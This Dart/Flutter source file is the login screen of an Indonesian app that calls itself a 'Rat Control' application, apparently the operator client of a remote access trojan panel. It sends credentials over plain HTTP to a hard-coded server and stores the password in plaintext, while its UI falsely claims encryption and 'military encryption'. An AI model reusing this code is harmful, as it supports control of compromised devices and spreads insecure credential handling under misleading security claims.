// login_page.dart
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'dashboard_page.dart';

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMixin {
  final TextEditingController _usernameController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  bool _obscurePassword = true;
  bool _isLoading = false;
  bool _rememberMe = false;
  bool _accountSaved = false;
  String _errorMessage = '';
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;

  final String baseUrl = 'http://ukianjaypanel7150.ymzprivat.biz.id:2142';

  final List<String> _aiMessages = [
    'Aplikasi Rat Control Sudah Ter Uji Coba',
    'Jangan Melakukan Tindakan Ilegal',
    '🔒 Keamanan adalah prioritas utama',
    'Gunakan sesuai aturan main',
    'Update berkala setiap minggu'
  ];
  int _aiMessageIndex = 0;
  Timer? _aiTimer;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeOutCubic,
    );
    _fadeController.forward();
    _loadSavedCredentials();
    _startAITimer();
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _aiTimer?.cancel();
    super.dispose();
  }

  void _startAITimer() {
    _aiTimer = Timer.periodic(const Duration(seconds: 4), (timer) {
      if (mounted) {
        setState(() {
          _aiMessageIndex = (_aiMessageIndex + 1) % _aiMessages.length;
        });
      }
    });
  }

  Future<void> _loadSavedCredentials() async {
    final prefs = await SharedPreferences.getInstance();
    final saved = prefs.getString('vyper_saved_creds');
    if (saved != null) {
      try {
        final decoded = jsonDecode(saved);
        setState(() {
          _usernameController.text = decoded['username'] ?? '';
          _passwordController.text = decoded['password'] ?? '';
          _accountSaved = true;
          _rememberMe = true;
        });
      } catch (_) {}
    }
    final remember = prefs.getBool('vyper_remember') ?? false;
    setState(() {
      _rememberMe = remember;
    });
  }

  Future<void> _saveCredentials() async {
    final prefs = await SharedPreferences.getInstance();
    if (_accountSaved) {
      await prefs.remove('vyper_saved_creds');
      setState(() => _accountSaved = false);
      _showToast('Dihapus', 'Data akun tersimpan telah dihapus', isError: true);
      return;
    }
    final username = _usernameController.text.trim();
    final password = _passwordController.text;
    if (username.isEmpty || password.isEmpty) {
      _showToast('Perlu Isi Dulu', 'Isi username & password sebelum menyimpan', isError: true);
      return;
    }
    await prefs.setString('vyper_saved_creds', jsonEncode({
      'username': username,
      'password': password,
    }));
    setState(() => _accountSaved = true);
    _showToast('Tersimpan!', 'Akun berhasil disimpan di perangkat ini');
  }

  Future<void> _toggleRemember() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() => _rememberMe = !_rememberMe);
    await prefs.setBool('vyper_remember', _rememberMe);
  }

  Future<String> _getDeviceId() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      if (Theme.of(context).platform == TargetPlatform.android) {
        final androidInfo = await deviceInfo.androidInfo;
        return androidInfo.id;
      } else if (Theme.of(context).platform == TargetPlatform.iOS) {
        final iosInfo = await deviceInfo.iosInfo;
        return iosInfo.identifierForVendor ?? 'ios_device';
      }
      return 'flutter_device_${DateTime.now().millisecondsSinceEpoch}';
    } catch (e) {
      return 'flutter_device_${DateTime.now().millisecondsSinceEpoch}';
    }
  }

  Future<void> _login() async {
    final username = _usernameController.text.trim();
    final password = _passwordController.text;

    if (username.isEmpty || password.isEmpty) {
      setState(() => _errorMessage = 'Username dan Password wajib diisi!');
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = '';
    });

    try {
      final deviceId = await _getDeviceId();
      final response = await http.post(
        Uri.parse('$baseUrl/api/login'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'username': username,
          'password': password,
          'deviceId': deviceId,
        }),
      );

      final data = jsonDecode(response.body);

      if (response.statusCode == 200 && data['ok'] == true) {
        final token = data['token'];
        final displayName = data['username'] ?? username;

        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('token', token);
        await prefs.setString('username', username);
        await prefs.setString('displayName', displayName);
        await prefs.setString('baseUrl', baseUrl);
        await prefs.setString('deviceId', deviceId);

        if (!mounted) return;

        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => DashboardPage(
              token: token,
              username: username,
              displayName: displayName,
              baseUrl: baseUrl,
              deviceId: deviceId,
            ),
          ),
        );
      } else {
        setState(() {
          _errorMessage = data['error'] ?? 'Login gagal!';
          _passwordController.clear();
        });
        _showToast('Gagal Masuk', _errorMessage, isError: true);
      }
    } catch (e) {
      setState(() {
        _errorMessage = 'Gagal terhubung ke server: $e';
      });
      _showToast('Koneksi Gagal', 'Tidak bisa konek ke server', isError: true);
    } finally {
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  void _showToast(String title, String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(
              isError ? Icons.error_outline : Icons.check_circle_outline,
              color: isError ? Colors.redAccent : Colors.greenAccent,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    title,
                    style: const TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                    ),
                  ),
                  Text(
                    message,
                    style: const TextStyle(fontSize: 11),
                  ),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: const Color(0xFF070f1c),
        duration: const Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(14),
          side: BorderSide(
            color: isError ? Colors.redAccent.withOpacity(0.2) : Colors.greenAccent.withOpacity(0.2),
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF04070e),
      body: SafeArea(
        child: FadeTransition(
          opacity: _fadeAnimation,
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 24),
            child: Column(
              children: [
                // Banner with fallback
                Container(
                  width: double.infinity,
                  height: 180,
                  decoration: BoxDecoration(
                    borderRadius: const BorderRadius.vertical(top: Radius.circular(22)),
                    border: Border.all(color: const Color(0xFF4f8dff).withOpacity(0.1)),
                    gradient: const LinearGradient(
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter,
                      colors: [Color(0xFF050d1f), Color(0xFF0d1e38)],
                    ),
                    image: const DecorationImage(
                      image: AssetImage('assets/images/login_banner.gif'),
                      fit: BoxFit.cover,
                      onError: (exception, stackTrace) => AssetImage(''),
                    ),
                  ),
                  child: Stack(
                    children: [
                      Container(
                        decoration: BoxDecoration(
                          borderRadius: const BorderRadius.vertical(top: Radius.circular(22)),
                          gradient: LinearGradient(
                            begin: Alignment.topCenter,
                            end: Alignment.bottomCenter,
                            colors: [
                              Colors.transparent,
                              Colors.transparent,
                              const Color(0xFF04070e).withOpacity(0.85),
                            ],
                          ),
                        ),
                      ),
                      Positioned(
                        bottom: 16,
                        left: 16,
                        right: 16,
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                const Text(
                                  'WELCOMEBACK',
                                  style: TextStyle(
                                    fontFamily: 'Bungee',
                                    fontSize: 28,
                                    color: Colors.white,
                                    letterSpacing: 3,
                                    shadows: [
                                      Shadow(
                                        blurRadius: 24,
                                        color: Colors.black87,
                                      ),
                                    ],
                                  ),
                                ),
                                Text(
                                  'Created By Gupong Official',
                                  style: TextStyle(
                                    fontFamily: 'IBM Plex Mono',
                                    fontSize: 9,
                                    color: Colors.white.withOpacity(0.5),
                                    letterSpacing: 3,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),

                // Login Card
                Container(
                  width: double.infinity,
                  decoration: BoxDecoration(
                    color: const Color(0xFF070f1c),
                    borderRadius: const BorderRadius.vertical(bottom: Radius.circular(22)),
                    border: Border(
                      left: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.1)),
                      right: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.1)),
                      bottom: BorderSide(color: const Color(0xFF4f8dff).withOpacity(0.1)),
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.75),
                        blurRadius: 100,
                        offset: const Offset(0, 40),
                      ),
                    ],
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(24),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        // Header
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  'Masuk ke akun kamu',
                                  style: TextStyle(
                                    fontFamily: 'Playfair Display',
                                    fontSize: 22,
                                    fontStyle: FontStyle.italic,
                                    color: Colors.white.withOpacity(0.9),
                                  ),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  'Secure · Encrypted · Private',
                                  style: TextStyle(
                                    fontFamily: 'IBM Plex Mono',
                                    fontSize: 9,
                                    color: const Color(0xFF4a6a9a),
                                    letterSpacing: 2,
                                  ),
                                ),
                                const SizedBox(height: 10),
                                Container(
                                  width: 28,
                                  height: 2,
                                  decoration: BoxDecoration(
                                    gradient: LinearGradient(
                                      colors: [const Color(0xFF4f8dff), Colors.transparent],
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            // Save Badge
                            GestureDetector(
                              onTap: _saveCredentials,
                              child: Column(
                                children: [
                                  Container(
                                    width: 38,
                                    height: 38,
                                    decoration: BoxDecoration(
                                      borderRadius: BorderRadius.circular(10),
                                      border: Border.all(
                                        color: _accountSaved
                                            ? Colors.greenAccent.withOpacity(0.5)
                                            : const Color(0xFF4f8dff).withOpacity(0.2),
                                      ),
                                      color: _accountSaved
                                          ? Colors.greenAccent.withOpacity(0.1)
                                          : const Color(0xFF4f8dff).withOpacity(0.06),
                                    ),
                                    child: Icon(
                                      Icons.save_outlined,
                                      size: 18,
                                      color: _accountSaved
                                          ? Colors.greenAccent
                                          : const Color(0xFF4a6a9a),
                                    ),
                                  ),
                                  const SizedBox(height: 4),
                                  Text(
                                    _accountSaved ? 'TERSIMPAN' : 'SIMPAN',
                                    style: TextStyle(
                                      fontFamily: 'IBM Plex Mono',
                                      fontSize: 8,
                                      color: _accountSaved
                                          ? Colors.greenAccent
                                          : const Color(0xFF4a6a9a),
                                      letterSpacing: 1.5,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),

                        const SizedBox(height: 20),

                        // AI Chip
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(24),
                            border: Border.all(
                              color: const Color(0xFF4f8dff).withOpacity(0.08),
                            ),
                            color: const Color(0xFF4f8dff).withOpacity(0.04),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.3),
                                blurRadius: 40,
                              ),
                            ],
                          ),
                          child: Row(
                            children: [
                              Container(
                                width: 34,
                                height: 34,
                                decoration: BoxDecoration(
                                  borderRadius: BorderRadius.circular(14),
                                  border: Border.all(
                                    color: const Color(0xFF4f8dff).withOpacity(0.06),
                                  ),
                                  color: const Color(0xFF4f8dff).withOpacity(0.06),
                                ),
                                child: Icon(
                                  Icons.chat_bubble_outline,
                                  size: 18,
                                  color: const Color(0xFF7eabff),
                                ),
                              ),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      'VYPER AI',
                                      style: TextStyle(
                                        fontFamily: 'Syne',
                                        fontSize: 13,
                                        fontWeight: FontWeight.w700,
                                        color: Colors.white.withOpacity(0.9),
                                        letterSpacing: 0.6,
                                      ),
                                    ),
                                    AnimatedSwitcher(
                                      duration: const Duration(milliseconds: 350),
                                      child: Text(
                                        _aiMessages[_aiMessageIndex],
                                        key: ValueKey(_aiMessageIndex),
                                        style: TextStyle(
                                          fontFamily: 'IBM Plex Mono',
                                          fontSize: 9,
                                          color: const Color(0xFF6a8aaa),
                                          letterSpacing: 0.8,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              IconButton(
                                onPressed: () {
                                  setState(() {
                                    _aiMessageIndex = (_aiMessageIndex + 1) % _aiMessages.length;
                                  });
                                },
                                icon: Icon(
                                  Icons.arrow_forward_ios,
                                  size: 16,
                                  color: Colors.white.withOpacity(0.3),
                                ),
                                padding: EdgeInsets.zero,
                                constraints: const BoxConstraints(),
                              ),
                              const SizedBox(width: 8),
                              IconButton(
                                onPressed: () {
                                  setState(() {
                                    // Hide AI chip
                                  });
                                },
                                icon: Icon(
                                  Icons.close,
                                  size: 14,
                                  color: Colors.white.withOpacity(0.3),
                                ),
                                padding: EdgeInsets.zero,
                                constraints: const BoxConstraints(),
                              ),
                            ],
                          ),
                        ),

                        const SizedBox(height: 20),

                        // Username Field
                        Container(
                          decoration: BoxDecoration(
                            color: const Color(0xFF4f8dff).withOpacity(0.025),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: const Color(0xFF4f8dff).withOpacity(0.1),
                            ),
                          ),
                          child: TextField(
                            controller: _usernameController,
                            style: const TextStyle(
                              color: Colors.white,
                              fontFamily: 'IBM Plex Mono',
                              fontSize: 12,
                            ),
                            decoration: InputDecoration(
                              hintText: 'username kamu',
                              hintStyle: TextStyle(
                                color: const Color(0xFF1a2d4a),
                                fontFamily: 'IBM Plex Mono',
                                fontStyle: FontStyle.italic,
                              ),
                              prefixIcon: Icon(
                                Icons.person_outline,
                                color: const Color(0xFF4a6a9a),
                                size: 18,
                              ),
                              border: InputBorder.none,
                              contentPadding: const EdgeInsets.symmetric(vertical: 14),
                            ),
                            onSubmitted: (_) => _login(),
                          ),
                        ),

                        const SizedBox(height: 16),

                        // Password Field
                        Container(
                          decoration: BoxDecoration(
                            color: const Color(0xFF4f8dff).withOpacity(0.025),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: const Color(0xFF4f8dff).withOpacity(0.1),
                            ),
                          ),
                          child: TextField(
                            controller: _passwordController,
                            obscureText: _obscurePassword,
                            style: const TextStyle(
                              color: Colors.white,
                              fontFamily: 'IBM Plex Mono',
                              fontSize: 12,
                            ),
                            decoration: InputDecoration(
                              hintText: 'password kamu',
                              hintStyle: TextStyle(
                                color: const Color(0xFF1a2d4a),
                                fontFamily: 'IBM Plex Mono',
                                fontStyle: FontStyle.italic,
                              ),
                              prefixIcon: Icon(
                                Icons.lock_outline,
                                color: const Color(0xFF4a6a9a),
                                size: 18,
                              ),
                              suffixIcon: IconButton(
                                icon: Icon(
                                  _obscurePassword
                                      ? Icons.visibility_off_outlined
                                      : Icons.visibility_outlined,
                                  color: const Color(0xFF4a6a9a),
                                  size: 18,
                                ),
                                onPressed: () {
                                  setState(() {
                                    _obscurePassword = !_obscurePassword;
                                  });
                                },
                              ),
                              border: InputBorder.none,
                              contentPadding: const EdgeInsets.symmetric(vertical: 14),
                            ),
                            onSubmitted: (_) => _login(),
                          ),
                        ),

                        const SizedBox(height: 8),

                        // Error Message
                        if (_errorMessage.isNotEmpty)
                          Padding(
                            padding: const EdgeInsets.only(top: 4),
                            child: Text(
                              _errorMessage,
                              style: const TextStyle(
                                color: Color(0xFFFF4D6D),
                                fontSize: 12,
                                fontFamily: 'IBM Plex Mono',
                              ),
                              textAlign: TextAlign.center,
                            ),
                          ),

                        const SizedBox(height: 16),

                        // Remember Row
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            GestureDetector(
                              onTap: _toggleRemember,
                              child: Row(
                                children: [
                                  Container(
                                    width: 16,
                                    height: 16,
                                    decoration: BoxDecoration(
                                      borderRadius: BorderRadius.circular(4),
                                      border: Border.all(
                                        color: _rememberMe
                                            ? const Color(0xFF7eabff)
                                            : const Color(0xFF4f8dff).withOpacity(0.25),
                                      ),
                                      color: _rememberMe
                                          ? const Color(0xFF4f8dff).withOpacity(0.2)
                                          : Colors.transparent,
                                    ),
                                    child: _rememberMe
                                        ? const Icon(
                                            Icons.check,
                                            size: 12,
                                            color: Color(0xFF7eabff),
                                          )
                                        : null,
                                  ),
                                  const SizedBox(width: 8),
                                  Text(
                                    'Ingat saya',
                                    style: TextStyle(
                                      fontFamily: 'IBM Plex Mono',
                                      fontSize: 9,
                                      color: const Color(0xFF4a6a9a),
                                      letterSpacing: 1.5,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),

                        const SizedBox(height: 20),

                        // Login Button
                        SizedBox(
                          width: double.infinity,
                          height: 50,
                          child: ElevatedButton(
                            onPressed: _isLoading ? null : _login,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: const Color(0xFF4f8dff).withOpacity(0.16),
                              foregroundColor: const Color(0xFF7eabff),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(13),
                              ),
                              side: BorderSide(
                                color: const Color(0xFF4f8dff).withOpacity(0.3),
                              ),
                              elevation: 0,
                              padding: EdgeInsets.zero,
                            ),
                            child: _isLoading
                                ? const SizedBox(
                                    width: 20,
                                    height: 20,
                                    child: CircularProgressIndicator(
                                      strokeWidth: 2,
                                      color: Color(0xFF7eabff),
                                    ),
                                  )
                                : Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Icon(
                                        Icons.login_outlined,
                                        size: 16,
                                        color: const Color(0xFF7eabff),
                                      ),
                                      const SizedBox(width: 8),
                                      Text(
                                        'Masuk Sekarang',
                                        style: TextStyle(
                                          fontFamily: 'Syne',
                                          fontSize: 12,
                                          fontWeight: FontWeight.w700,
                                          color: const Color(0xFF7eabff),
                                          letterSpacing: 2.5,
                                        ),
                                      ),
                                    ],
                                  ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),

                const SizedBox(height: 16),

                // Service Row
                Row(
                  children: [
                    Expanded(
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(
                            color: const Color(0xFF4f8dff).withOpacity(0.07),
                          ),
                          color: const Color(0xFF4f8dff).withOpacity(0.03),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 34,
                              height: 34,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(
                                  color: const Color(0xFF4f8dff).withOpacity(0.08),
                                ),
                                color: const Color(0xFF4f8dff).withOpacity(0.06),
                              ),
                              child: const Icon(
                                Icons.calendar_month_outlined,
                                size: 16,
                                color: Color(0xFF7eabff),
                              ),
                            ),
                            const SizedBox(width: 10),
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  'Server Stabil',
                                  style: TextStyle(
                                    fontFamily: 'Syne',
                                    fontSize: 11,
                                    fontWeight: FontWeight.w700,
                                    color: Colors.white.withOpacity(0.9),
                                  ),
                                ),
                                Text(
                                  'Uptime 99.9%',
                                  style: TextStyle(
                                    fontFamily: 'IBM Plex Mono',
                                    fontSize: 8,
                                    color: const Color(0xFF4a6a9a),
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(
                            color: const Color(0xFF4f8dff).withOpacity(0.07),
                          ),
                          color: const Color(0xFF4f8dff).withOpacity(0.03),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 34,
                              height: 34,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(
                                  color: const Color(0xFF4f8dff).withOpacity(0.08),
                                ),
                                color: const Color(0xFF4f8dff).withOpacity(0.06),
                              ),
                              child: const Icon(
                                Icons.shield_outlined,
                                size: 16,
                                color: Color(0xFF7eabff),
                              ),
                            ),
                            const SizedBox(width: 10),
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  'Terjamin Aman',
                                  style: TextStyle(
                                    fontFamily: 'Syne',
                                    fontSize: 11,
                                    fontWeight: FontWeight.w700,
                                    color: Colors.white.withOpacity(0.9),
                                  ),
                                ),
                                Text(
                                  'Enkripsi militer',
                                  style: TextStyle(
                                    fontFamily: 'IBM Plex Mono',
                                    fontSize: 8,
                                    color: const Color(0xFF4a6a9a),
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 12),

                // Register Button
                SizedBox(
                  width: double.infinity,
                  child: OutlinedButton(
                    onPressed: () {
                      // Navigate to register page
                    },
                    style: OutlinedButton.styleFrom(
                      foregroundColor: const Color(0xFF62d0ff),
                      side: BorderSide(
                        color: const Color(0xFF229ED9).withOpacity(0.28),
                      ),
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(13),
                      ),
                      backgroundColor: const Color(0xFF229ED9).withOpacity(0.1),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.person_add_outlined,
                          size: 16,
                          color: const Color(0xFF62d0ff),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          'REGISTRASI AKUN',
                          style: TextStyle(
                            fontFamily: 'Syne',
                            fontSize: 11,
                            fontWeight: FontWeight.w700,
                            color: const Color(0xFF62d0ff),
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),

                const SizedBox(height: 20),

                // Footer
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      'VYPER',
                      style: TextStyle(
                        fontFamily: 'IBM Plex Mono',
                        fontSize: 8,
                        color: const Color(0xFF4a6a9a).withOpacity(0.45),
                        letterSpacing: 2.5,
                      ),
                    ),
                    Container(
                      width: 3,
                      height: 3,
                      margin: const EdgeInsets.symmetric(horizontal: 8),
                      decoration: const BoxDecoration(
                        color: Color(0xFF4f8dff),
                        shape: BoxShape.circle,
                      ),
                    ),
                    Text(
                      '2026',
                      style: TextStyle(
                        fontFamily: 'IBM Plex Mono',
                        fontSize: 8,
                        color: const Color(0xFF4a6a9a).withOpacity(0.45),
                        letterSpacing: 2.5,
                      ),
                    ),
                    Container(
                      width: 3,
                      height: 3,
                      margin: const EdgeInsets.symmetric(horizontal: 8),
                      decoration: const BoxDecoration(
                        color: Color(0xFF4f8dff),
                        shape: BoxShape.circle,
                      ),
                    ),
                    Text(
                      'GUPONG OFFICIAL',
                      style: TextStyle(
                        fontFamily: 'IBM Plex Mono',
                        fontSize: 8,
                        color: const Color(0xFF4a6a9a).withOpacity(0.45),
                        letterSpacing: 2.5,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}